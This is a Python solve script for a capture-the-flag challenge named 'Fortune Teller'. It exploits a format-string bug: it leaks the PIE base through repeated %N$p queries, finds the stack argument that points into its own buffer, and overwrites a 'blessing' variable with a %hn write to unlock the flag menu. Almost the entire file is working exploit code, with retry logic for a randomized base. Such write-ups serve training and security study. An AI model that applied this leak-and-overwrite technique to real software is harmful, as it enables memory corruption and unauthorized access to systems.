#!/usr/bin/env python3
# Fortune Teller (FortiD 2026) exploit.
# Leak the PIE base through %N$p, write 0x1337 into blessing with %hn,
# then take menu 2 and read the flag.
#
# The address we put into the format string must not contain a newline
# byte (0x0a): read_line() would stop there and the write would be
# truncated. The base is randomized per connection, so we simply retry
# until the address is clean.
#
# Usage:
#   python3 solve.py                     # remote, host/port from below
#   python3 solve.py <host> <port>
#   python3 solve.py ./fortune           # local binary instead of remote
import os
import socket
import ssl
import struct
import subprocess
import sys

HOST = 'fortune-teller-<...>.inst15.ctf.fortid.com'
PORT = 1337

LEAK_OFFSETS = (0x3d68, 0x1664, 0x1441, 0x1570, 0x11c0)
BLESSING_OFF = 0x404c
MARKER = 0x4b4a494847464544  # "DEFGHIJK"


def recv_until(f, marker):
    data = b''
    while marker not in data:
        b = f.read(1)  # byte at a time: pipes/sockets block on read(n)
        if not b:
            break
        data += b
    return data


def ask(fin, fout, question):
    # send one question, return the oracle's answer line
    if len(question) > 255:
        raise ValueError('question too long')
    recv_until(fin, b'> ')
    fout.write(b'1\n')
    fout.flush()
    recv_until(fin, b'> ')
    fout.write(question + b'\n')
    fout.flush()
    recv_until(fin, b'The oracle speaks:\n')
    return recv_until(fin, b'\n').strip()


def connect(host, port):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((host, port), timeout=15)
    s = ctx.wrap_socket(raw, server_hostname=host)
    return s.makefile('rb'), s.makefile('wb')


def find_pie_base(fin, fout):
    # collect %N$p values in the ELF range and match them to known offsets
    hits = {}
    for n in range(6, 73):
        resp = ask(fin, fout, ('%' + str(n) + '$p').encode())
        if not resp.startswith(b'0x'):
            continue
        ptr = int(resp, 16)
        for off in LEAK_OFFSETS:
            base = ptr - off
            if (base & 0xfff) == 0 and 0x500000000000 <= base < 0x700000000000:
                hits.setdefault(base, []).append(n)
    if not hits:
        sys.exit('no PIE leaks found')
    base = max(hits, key=lambda b: len(hits[b]))
    print('[+] PIE base %#x (%d leaks)' % (base, len(hits[base])))
    return base


def find_write_arg(fin, fout):
    # find which argument prints a marker placed at buffer offset 16
    want = ('0x%x' % MARKER).encode()
    for n in range(6, 19):
        fmt = ('%' + str(n) + '$p').encode()
        payload = fmt.ljust(16, b'\0') + struct.pack('<Q', MARKER)
        if ask(fin, fout, payload) == want:
            print('[+] write through argument %d' % n)
            return n
    sys.exit('write slot not found')


def run(fin, fout):
    base = find_pie_base(fin, fout)
    arg = find_write_arg(fin, fout)

    fmt = ('%%%dc%%%d$hn' % (0x1337, arg)).encode()
    payload = fmt.ljust(16, b'\0') + struct.pack('<Q', base + BLESSING_OFF)
    if b'\n' in payload:
        raise ValueError('address contains newline byte, retrying')
    ask(fin, fout, payload)

    recv_until(fin, b'> ')
    fout.write(b'2\n')
    fout.flush()
    print(recv_until(fin, b'\n').decode(errors='replace').strip())
    print(recv_until(fin, b'\n').decode(errors='replace').strip())


def main():
    if len(sys.argv) > 1 and os.path.exists(sys.argv[1]):
        # local run against a binary
        proc = subprocess.Popen([sys.argv[1]], stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        try:
            run(proc.stdout, proc.stdin)
        except ValueError as e:
            proc.kill()
            sys.exit(str(e))
        return

    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    for attempt in range(10):
        fin, fout = connect(host, port)
        try:
            run(fin, fout)
            return
        except ValueError as e:
            print('attempt %d: %s' % (attempt + 1, e))
            continue
    sys.exit('gave up after 10 attempts')


if __name__ == '__main__':
    main()